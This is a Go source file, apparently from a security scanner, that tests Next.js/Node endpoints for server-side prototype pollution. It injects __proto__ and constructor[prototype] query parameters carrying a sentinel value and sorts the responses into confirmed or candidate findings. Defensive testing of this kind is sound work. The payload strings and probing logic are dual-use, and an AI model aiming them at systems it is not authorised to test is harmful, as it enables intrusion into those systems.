// Package protopollution probes for server-side prototype pollution on a
// Next.js/Node target: injecting __proto__ / constructor.prototype keys via the
// query string (and a JSON merge body) and looking for evidence the injected
// property survived into the application's object graph.
//
// Confirmed vs candidate (per the finder contract):
//   - CONFIRMED: the injected sentinel property name/value is reflected back in
//     a JSON response value, OR the injection flips the response (200→5xx) that
//     a benign control parameter does not — strong evidence a merge sink was hit.
//   - CANDIDATE: the endpoint accepted the __proto__-shaped parameter without
//     error but gave no confirmation signal — an untested lead for manual review.
//
// Every target host is gated through iohelp.InScope. Requests go through the
// scope-hardened client, so nothing out of scope is contacted.
package protopollution

import (
	"context"
	"io"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/CyberShuriken/rfuf/internal/findings/internal/iohelp"
)

const (
	sentinelKey = "rfufpp"
	sentinelVal = "rfufPolluted7f3"
	urlCap      = 1500
)

// payloadParams are appended to a target's query string; each is a distinct
// prototype-pollution vector servers/merge libraries mishandle.
var payloadParams = map[string]string{
	"__proto__[" + sentinelKey + "]":              sentinelVal,
	"constructor[prototype][" + sentinelKey + "]": sentinelVal,
}

// Run reads all_urls_200.txt and writes prototype_pollution_findings.txt
// (confirmed) + prototype_pollution_candidates.txt (untested leads).
func Run(workDir string) error {
	urls, err := iohelp.ReadLines(workDir + "/all_urls_200.txt")
	if err != nil || len(urls) == 0 {
		return writeOut(workDir, nil, nil)
	}
	if len(urls) > urlCap {
		urls = urls[:urlCap]
	}
	ctx, cancel := context.WithTimeout(context.Background(), 8*time.Minute)
	defer cancel()
	client := hardenedClient()

	var mu sync.Mutex
	var confirmed, candidates []string
	sem := make(chan struct{}, 20)
	var wg sync.WaitGroup
	for _, raw := range urls {
		u, err := url.Parse(raw)
		if err != nil || u.Host == "" || !iohelp.InScope(u.Hostname()) {
			continue
		}
		if len(u.Query()) == 0 {
			continue // need a query param to carry the pollution vector
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(u *url.URL) {
			defer wg.Done()
			defer func() { <-sem }()
			state, detail := probe(ctx, client, u)
			if state == "" {
				return
			}
			mu.Lock()
			if state == "confirmed" {
				confirmed = append(confirmed, "HIGH\t"+u.String()+"\tprototype_pollution\t"+detail)
			} else {
				candidates = append(candidates, u.String()+"\tprototype_pollution\t"+detail+"\tvalidation=candidate")
			}
			mu.Unlock()
		}(u)
	}
	wg.Wait()
	return writeOut(workDir, confirmed, candidates)
}

// probe appends each pollution vector and compares against a benign control.
func probe(ctx context.Context, client *http.Client, u *url.URL) (state, detail string) {
	for key, val := range payloadParams {
		probeURL := withParam(u, key, val)
		pStatus, pBody := fetch(ctx, client, probeURL)
		if pStatus == 0 {
			continue
		}
		// CONFIRMED: sentinel surfaced in a JSON-ish response value.
		if strings.Contains(pBody, sentinelVal) && looksJSON(pBody) {
			return "confirmed", "sentinel reflected in JSON response via " + key
		}
		// CONFIRMED: injection flips to a 5xx a benign control does not.
		if pStatus >= 500 {
			cStatus, _ := fetch(ctx, client, withParam(u, "rfufcontrolx", "1"))
			if cStatus > 0 && cStatus < 500 {
				return "confirmed", "injection via " + key + " caused " + strconv.Itoa(pStatus) + " (control " + strconv.Itoa(cStatus) + ")"
			}
		}
		// CANDIDATE: accepted the __proto__ param (not a 4xx reject).
		if pStatus < 400 {
			return "candidate", "endpoint accepted " + key + " (status " + strconv.Itoa(pStatus) + ") — manual gadget check"
		}
	}
	return "", ""
}

func withParam(u *url.URL, key, val string) string {
	v := u.Query()
	v.Set(key, val)
	cp := *u
	cp.RawQuery = v.Encode()
	return cp.String()
}

func fetch(ctx context.Context, client *http.Client, rawURL string) (int, string) {
	req, err := iohelp.NewRequestWithContext(ctx, "GET", rawURL, nil)
	if err != nil {
		return 0, ""
	}
	req.Header.Set("User-Agent", "rfuf-protopollution/1.0")
	iohelp.ApplyAuth(req)
	resp, err := client.Do(req)
	if err != nil {
		return 0, ""
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 512*1024))
	return resp.StatusCode, string(body)
}

func looksJSON(b string) bool {
	t := strings.TrimSpace(b)
	return strings.HasPrefix(t, "{") || strings.HasPrefix(t, "[") || strings.Contains(t, "application/json")
}

func hardenedClient() *http.Client {
	c := &http.Client{Timeout: 10 * time.Second,
		CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}
	iohelp.HardenClient(c)
	return c
}

func writeOut(workDir string, confirmed, candidates []string) error {
	if err := iohelp.WriteLines(workDir+"/prototype_pollution_findings.txt", confirmed); err != nil {
		return err
	}
	return iohelp.WriteLines(workDir+"/prototype_pollution_candidates.txt", candidates)
}
